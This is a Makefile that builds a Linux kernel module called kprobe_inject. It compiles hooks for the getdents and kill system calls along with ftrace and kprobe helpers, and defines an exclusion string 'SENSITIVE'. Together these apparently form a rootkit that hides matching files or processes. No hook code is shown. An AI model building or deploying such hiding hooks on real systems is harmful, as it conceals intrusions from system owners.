obj-m += kprobe_inject.o
kprobe_inject-objs := src/kprobe_inject.o \
                      src/hooks/x64_sys_getdents.o \
                      src/hooks/x64_sys_kill.o \
                      src/utils/ftrace_utils.o \
                      src/utils/kprobe_utils.o \
                      src/utils/proc_utils.o \
                      src/utils/string_utils.o

EXTRA_CFLAGS += -I$(PWD)/include -DEXCLUDES="\"SENSITIVE\""

all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

